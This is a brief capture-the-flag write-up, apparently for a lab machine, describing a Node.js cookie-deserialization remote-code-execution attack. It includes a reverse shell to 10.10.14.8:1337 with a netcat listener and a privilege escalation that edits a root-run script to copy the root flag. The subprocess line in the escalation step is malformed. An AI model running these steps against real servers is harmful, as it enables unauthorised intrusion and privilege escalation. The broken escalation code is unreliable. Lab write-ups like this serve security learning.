@@ -1,0 +1,54 @@
+Celetial
+
+1) Scanning shows port 3000 is open with Node Express framework
+
+2) Sending a GET request to the webserver on http://10.10.10.85:3000/ returns the string 'Hey Dummy 2 + 2 is 22'.
+
+3) Examining this in Burp suite shows us a base64 encoded cookie which can be decoded as:
+{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
+
+4) Searching this online provides the link:
+https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
+
+5) This shows that when the cookie parameter is taken in by Node js as a base 64 string and an unserialised funstion is used to determine these parameters. This function is exploitable.
+
+6) A nodejs payload for a reverse shell can be created using the nodejsshell.py script available at:
+https://github.com/ajinabraham/Node.Js-Security-Course
+
+7) This is used as follows:
+python nodejsshell.py 10.10.14.8 1337
+
+8) This payload was determined to be the following:
+
+{"rce":"_$$ND_FUNC$$_function (){ <payload spit out by the script>}()"}
+
+To send it to the server this payload was base64 and URL encoded.
+
+9) An error was received which stated that the username was invalid. The valid username can be found out by sending an invalid token by changing the initial shtring as shown in Step 3.
+
+10) The correct username was found to be 'sun'.
+
+The payload was edited to be:
+
+{"username":"sun","rce":"_$$ND_FUNC$$_function (){ <payload spit out by the script>}()"}
+
+11)  Create a listener at 1337 --> nc -lp 1337
+
+12) send the reguest to the server and Voila we get a reverse shell.
+
+13) The user flag is present in the Documents folder. This folder also has a file called 'script.py'. this script says:
+
+print "Script is running..."
+
+This script belongs to the user 'sun'
+
+14) This output is seen to be in a file in called output.txt which is in the /home/sun directory and belongs to root. This shows that there is probably a service which runs 'script.py' to print output to output.txt
+
+15) changed the script.py to:
+
+import subprocess
+subprocess.call["sudo","cp","/root/root.txt","/tmp/abc.txt"]
+
+16) This copied the root flag to the abc.txt file.
+
+17) Finally root flag.
